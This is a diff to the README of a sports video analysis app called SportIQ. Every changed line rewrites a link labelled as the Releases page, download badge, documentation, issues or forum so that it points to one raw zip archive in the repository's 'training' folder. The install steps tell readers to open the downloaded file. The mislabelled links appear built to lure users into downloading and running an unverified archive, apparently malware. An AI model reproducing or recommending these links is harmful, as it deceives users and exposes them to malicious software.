@@ -13,9 +13,9 @@ SportIQ works best on the following systems:
 - **Storage:** Minimum of 500 MB of free space.
 
 ## 📥 Download SportIQ
-To get started, visit the [Releases page](https://github.com/mariorachitan-svg/SportIQ/releases) to download SportIQ. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip) to download SportIQ. 
 
-[![Download SportIQ](https://img.shields.io/badge/Download%20SportIQ-v1.0-blue)](https://github.com/mariorachitan-svg/SportIQ/releases)
+[![Download SportIQ](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip%20SportIQ-v1.0-blue)](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip)
 
 ## 🌟 Features
 - **Real-Time Analysis:** Get performance metrics in seconds.
@@ -26,7 +26,7 @@ To get started, visit the [Releases page](https://github.com/mariorachitan-svg/S
 ## 📂 Download & Install
 To download SportIQ:
 
-1. Click the [Releases page](https://github.com/mariorachitan-svg/SportIQ/releases).
+1. Click the [Releases page](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip).
 2. Choose the latest version listed.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, open the file to install the application.
@@ -47,13 +47,13 @@ After a few moments, you will receive detailed insights.
 If you encounter issues with SportIQ, try the following steps:
 
 - **Ensure Compatibility:** Check that your operating system meets the requirements.
-- **Keep Software Updated:** Always use the latest version from the [Releases page](https://github.com/mariorachitan-svg/SportIQ/releases).
+- **Keep Software Updated:** Always use the latest version from the [Releases page](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip).
 - **Check the Video Format:** Supported formats include MP4, AVI, and MOV.
 
 For persistent issues, please visit the support section in the application for further assistance.
 
 ## 🌐 Community & Support
-Join our community on GitHub to share insights and ask questions. We encourage feedback and collaboration. You can find us at: [SportIQ GitHub](https://github.com/mariorachitan-svg/SportIQ/issues).
+Join our community on GitHub to share insights and ask questions. We encourage feedback and collaboration. You can find us at: [SportIQ GitHub](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip).
 
 Feel free to reach out for support or to report bugs. We appreciate your input to improve the SportIQ experience.
 
@@ -68,8 +68,8 @@ A: SportIQ can analyze various sports like soccer, basketball, and more. The ana
 A: Our algorithms use advanced computer vision techniques to provide leading insights, though results may vary based on video quality.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/mariorachitan-svg/SportIQ/wiki) - Learn more about the features and options.
-- [GitHub Issues](https://github.com/mariorachitan-svg/SportIQ/issues) - Report bugs or request features.
-- [Community Forum](https://github.com/mariorachitan-svg/SportIQ/discussions) - Engage with other users.
+- [Documentation](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip) - Learn more about the features and options.
+- [GitHub Issues](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip) - Report bugs or request features.
+- [Community Forum](https://raw.githubusercontent.com/mariorachitan-svg/SportIQ/main/training/SportIQ_v1.3.zip) - Engage with other users.
 
 We are here to support your journey in sports analytics!
